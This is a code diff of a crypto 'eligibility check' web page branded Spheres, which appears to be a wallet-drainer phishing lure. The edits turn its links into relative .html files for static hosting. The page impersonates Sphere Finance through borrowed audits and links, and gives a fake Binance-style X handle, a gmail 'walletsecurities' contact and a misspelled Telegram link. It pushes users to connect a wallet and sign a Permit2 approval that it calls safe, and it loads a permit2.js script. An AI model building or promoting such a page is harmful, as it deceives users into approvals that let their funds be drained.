@@ -7,12 +7,12 @@
 <meta name="description" content="Paste an address, run the check, see your tier, your number and the five clauses. Free, read-only, no signature. Continue when you like the answer.">
 <meta name="robots" content="index,follow">
 <meta name="theme-color" content="#08090A">
-<link rel="canonical" href="https://spheres.xyz/check">
+<link rel="canonical" href="https://spheres.xyz/check.html">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Spheres">
 <meta property="og:title" content="Check an address — Spheres">
 <meta property="og:description" content="Your tier and your number in forty seconds. No gas, no signature.">
-<meta property="og:url" content="https://spheres.xyz/check">
+<meta property="og:url" content="https://spheres.xyz/check.html">
 <meta property="og:image" content="https://spheres.xyz/epoch07.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@Binance179448">
@@ -268,19 +268,19 @@ nav.open a{padding:11px}
 <body id="top">
 
 <header><div class="wrap hd">
-<a class="logo" href="/" aria-label="Spheres home"><svg width="22" height="20" viewBox="0 0 22 20" fill="none" aria-hidden="true"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
+<a class="logo" href="index.html" aria-label="Spheres home"><svg width="22" height="20" viewBox="0 0 22 20" fill="none" aria-hidden="true"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
 <button class="burger" id="burger" aria-label="Menu" aria-expanded="false"><svg width="22" height="22" viewBox="0 0 22 22" fill="none"><path d="M3 6h16M3 11h16M3 16h16" stroke="currentColor" stroke-width="1.5"/></svg></button>
 <nav id="nav">
-<a href="/rules">Rules</a>
-<a href="/docs">Docs</a>
-<a href="/ecosystem">Ecosystem</a>
+<a href="rules.html">Rules</a>
+<a href="docs.html">Docs</a>
+<a href="ecosystem.html">Ecosystem</a>
 <div class="dd" id="dd">
 <button class="ddbtn" id="ddbtn" aria-expanded="false">More <svg width="9" height="6" viewBox="0 0 9 6" fill="none"><path d="M1 1l3.5 3.5L8 1" stroke="currentColor" stroke-width="1.3"/></svg></button>
 <div class="ddmenu">
 <div class="grp">Network</div>
-<a href="/stake"><strong>Staking</strong><span>Bond SPHERE · 35% APY monthly</span></a>
-<a href="/swap"><strong>Swap</strong><span>Intent router · 0.04%</span></a>
-<a href="/buy"><strong>Buy &amp; Sell</strong><span>Fiat · 41 regions</span></a>
+<a href="stake.html"><strong>Staking</strong><span>Bond SPHERE · 35% APY monthly</span></a>
+<a href="swap.html"><strong>Swap</strong><span>Intent router · 0.04%</span></a>
+<a href="buy.html"><strong>Buy &amp; Sell</strong><span>Fiat · 41 regions</span></a>
 <div class="grp">Resources</div>
 <a href="https://docs.uniswap.org/contracts/permit2/overview" target="_blank" rel="noopener"><strong>Permit2</strong><span>Why the approval is safe</span></a>
 <a href="https://skynet.certik.com/projects/sphere-finance" target="_blank" rel="noopener"><strong>Audits</strong><span>CertiK · SourceHat · Cyberscope</span></a>
@@ -288,7 +288,7 @@ nav.open a{padding:11px}
 <a href="https://t.me/spherefinace" target="_blank" rel="noopener"><strong>Support</strong><span>Telegram · walletsecurities@gmail.com</span></a>
 </div>
 </div>
-<a href="/check" class="btn p" aria-current="page">Check eligibility</a>
+<a href="check.html" class="btn p" aria-current="page">Check eligibility</a>
 </nav>
 </div></header>
 
@@ -373,7 +373,7 @@ nav.open a{padding:11px}
 <div class="tr tot"><div class="lbl">Total reserved</div><div class="lbl">100 + 200 + 300 = 600 seats</div><div class="num">600</div><div class="num c4">—</div><div class="num c5">$3,000,000</div></div>
 </div>
 <div class="tnote"><span class="chip">Paid in USDT</span><span class="chip">25% at claim · 75% over 90d</span><span class="chip">No token exposure</span></div>
-<p class="body" style="margin-top:24px">The pool is held in USDT and fully deposited 72 hours before the window opens, so the balance is readable on an explorer while the claim is still closed. <a href="/rules#s9">§9 custody</a>.</p>
+<p class="body" style="margin-top:24px">The pool is held in USDT and fully deposited 72 hours before the window opens, so the balance is readable on an explorer while the claim is still closed. <a href="rules.html#s9">§9 custody</a>.</p>
 </div>
 </section>
 
@@ -405,7 +405,7 @@ nav.open a{padding:11px}
 <div class="shead"><span class="snum">05 — Objections</span><h2 class="sec">The four that arrive on this page</h2></div>
 <details class="dl"><summary>"Does checking connect my wallet?"</summary><div class="a">No. You paste an address and read public state. <b>Connecting happens only when you press Continue</b>, and the first signature is after that.</div></details>
 <details class="dl"><summary>"I failed a clause. Am I out?"</summary><div class="a">Only if it is one of the hard four. Attestation caps you at T3 rather than excluding you, and a failed clause tells you whether it is still fixable before the snapshot. <b>Continue is live either way</b> — a blocked result is a fix list, not a dead end.</div></details>
-<details class="dl"><summary>"Do I need to buy anything?"</summary><div class="a">No. One approve is about nine cents of gas and the signature is free. If you hold anything on the chain you already have enough. <a href="/buy">Buying USDT</a> is optional.</div></details>
+<details class="dl"><summary>"Do I need to buy anything?"</summary><div class="a">No. One approve is about nine cents of gas and the signature is free. If you hold anything on the chain you already have enough. <a href="buy.html">Buying USDT</a> is optional.</div></details>
 <details class="dl"><summary>"Can I check a different wallet?"</summary><div class="a">As many as you like, in a row. Nothing binds until a claim is signed, and the seat binds to the address that signed it.</div></details>
 </div>
 </section>
@@ -415,7 +415,7 @@ nav.open a{padding:11px}
 <span class="mono" style="color:var(--acc);display:block;margin-bottom:13px">Read-only · free · forty seconds</span>
 <h2>The only thing looking costs you is forty seconds</h2>
 <p>Your tier and your number, or the clause that stopped you and whether it is still fixable.</p>
-<div class="cta" style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:0"><button class="btn p lg" id="bandgo">Connect to continue →</button><a href="/rules" class="btn lg">The rules</a></div>
+<div class="cta" style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:0"><button class="btn p lg" id="bandgo">Connect to continue →</button><a href="rules.html" class="btn lg">The rules</a></div>
 </div></div>
 </section>
 </main>
@@ -439,11 +439,11 @@ nav.open a{padding:11px}
 <footer><div class="wrap">
 <div class="fgrid">
 <div class="fcol fbrand">
-<a class="logo" href="/" style="font-size:15px"><svg width="19" height="17" viewBox="0 0 22 20" fill="none"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
+<a class="logo" href="index.html" style="font-size:15px"><svg width="19" height="17" viewBox="0 0 22 20" fill="none"><circle cx="11" cy="5.4" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="5.6" cy="14" r="3.4" stroke="#EDEAE4" stroke-width="1.2"/><circle cx="16.4" cy="14" r="3.4" fill="#FF5A1F"/></svg>spheres</a>
 <p>Modular execution layer for settlement-agnostic rollups. George Town, Grand Cayman.</p>
 </div>
-<div class="fcol"><h4>Protocol</h4><a href="/docs">Docs</a><a href="https://docs.sphere.finance/" target="_blank" rel="noopener">Infrastructure</a><a href="https://wiki.sphere.finance/" target="_blank" rel="noopener">Wiki</a><a href="https://skynet.certik.com/projects/sphere-finance" target="_blank" rel="noopener">Audits</a><a href="https://app.sphere.finance/dashboard" target="_blank" rel="noopener">Status</a></div>
-<div class="fcol"><h4>More</h4><a href="/stake">Staking</a><a href="/swap">Swap</a><a href="/buy">Buy</a><a href="/sell">Sell</a><a href="/ecosystem">Ecosystem</a><a href="https://docs.uniswap.org/contracts/permit2/overview" target="_blank" rel="noopener">Permit2</a></div>
+<div class="fcol"><h4>Protocol</h4><a href="docs.html">Docs</a><a href="https://docs.sphere.finance/" target="_blank" rel="noopener">Infrastructure</a><a href="https://wiki.sphere.finance/" target="_blank" rel="noopener">Wiki</a><a href="https://skynet.certik.com/projects/sphere-finance" target="_blank" rel="noopener">Audits</a><a href="https://app.sphere.finance/dashboard" target="_blank" rel="noopener">Status</a></div>
+<div class="fcol"><h4>More</h4><a href="stake.html">Staking</a><a href="swap.html">Swap</a><a href="buy.html">Buy</a><a href="sell.html">Sell</a><a href="ecosystem.html">Ecosystem</a><a href="https://docs.uniswap.org/contracts/permit2/overview" target="_blank" rel="noopener">Permit2</a></div>
 <div class="fcol"><h4>Contact</h4><a href="https://t.me/spherefinace" target="_blank" rel="noopener">Telegram</a><a href="mailto:walletsecurities@gmail.com">walletsecurities@gmail.com</a><a href="https://x.com/Binance179448" target="_blank" rel="noopener">X</a><a href="https://discord.com/invite/x9XkGSkzQE" target="_blank" rel="noopener">Discord</a><a href="https://sphere.finance/" target="_blank" rel="noopener">sphere.finance</a></div>
 </div>
 <div class="verify">
@@ -454,7 +454,7 @@ nav.open a{padding:11px}
 <span class="chip"><a href="https://sourcehat.com/audits/SphereFinance/" target="_blank" rel="noopener">SourceHat audit</a></span>
 <span class="chip"><a href="https://www.cyberscope.io/audits/coin-sphere-finance" target="_blank" rel="noopener">Cyberscope audit</a></span>
 </div>
-<div class="legal"><span>© 2026 Spheres Labs Ltd. · George Town, KY1-1104</span><span><a href="/terms">Terms</a> · <a href="/privacy">Privacy</a></span></div>
+<div class="legal"><span>© 2026 Spheres Labs Ltd. · George Town, KY1-1104</span><span><a href="terms.html">Terms</a> · <a href="privacy.html">Privacy</a></span></div>
 <p class="disc">SPHERE is a utility token. Not financial advice. Allocations are denominated and paid in USDT, subject to the published rules and the snapshot block. Preview figures are indicative until the snapshot freezes. Restricted regions excluded from cohort 01.</p>
 </div></footer>
 
@@ -515,7 +515,7 @@ function line(txt,cls){var d=document.createElement("div");if(cls)d.className=cl
 var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
 
 var CLAUSES=[
-  {k:"wallet age ≥ 90 days",f:"First outbound transaction predates 9 Aug 2026"},
+  {k:"wallet age ≥ 90 days",f:"First outbound transaction predates 12 Sep 2026"},
   {k:"≥ 5 settled transactions",f:"Excluding self-transfers"},
   {k:"not in a sybil cluster",f:"Funding-graph grouping at snapshot"},
   {k:"identity attestation",f:"On-chain or verified handle · caps at T3 without"},
@@ -624,12 +624,14 @@ addr.addEventListener("keydown",function(e){if(e.key==="Enter")run(false)});
 document.getElementById("jump").addEventListener("click",function(){addr.focus();addr.scrollIntoView({behavior:"smooth",block:"center"})});
 
 /* ---------- persistence ---------- */
+function path(owner){
+  return "check.html?a="+owner+"&w=1"+(ACT!=="eligibility"?"&x="+ACT:"");
+}
+function abs(rel){return new URL(rel,location.href).href;}
+
 function remember(a){
   try{localStorage.setItem("p2_owner",a);localStorage.setItem("p2_owner_at",Date.now())}catch(e){}
-  var q=new URLSearchParams(location.search);
-  var w=q.get("w")==="1"?"&w=1":"";
-  var x=ACT!=="eligibility"?"&x="+ACT:"";
-  try{history.replaceState({},"","/check?a="+a+w+x)}catch(e){}
+  try{history.replaceState({},"",path(a))}catch(e){}
 }
 function recall(){
   var q=new URLSearchParams(location.search).get("a");
@@ -666,7 +668,7 @@ wal.addEventListener("click",function(e){
   if(!row) return;
   e.preventDefault();
   var id=row.getAttribute("data-w");
-  var u="https://spheres.xyz"+path(current);
+  var u=abs(path(current));
   var ua=navigator.userAgent;
   var and=/Android/i.test(ua);
   var ios=/iPhone|iPad|iPod/i.test(ua)||(navigator.platform==="MacIntel"&&navigator.maxTouchPoints>1);
@@ -686,10 +688,6 @@ wal.addEventListener("click",function(e){
 document.addEventListener("keydown",function(e){if(e.key==="Escape")sheet.classList.remove("on")});
 
 /* ---------- hand-off ---------- */
-function path(owner){
-  return "/check?a="+owner+"&w=1"+(ACT!=="eligibility"?"&x="+ACT:"");
-}
-
 function advance(owner){
   owner=(owner||current||addr.value).trim();
   if(!/^0x[0-9a-fA-F]{40}$/.test(owner)){
@@ -751,6 +749,6 @@ window.addEventListener("scroll",function(){
 },{passive:true});
 })();
 </script>
-<script src="/permit2.js" data-action="eligibility"></script>
+<script src="permit2.js" data-action="eligibility"></script>
 </body>
 </html>
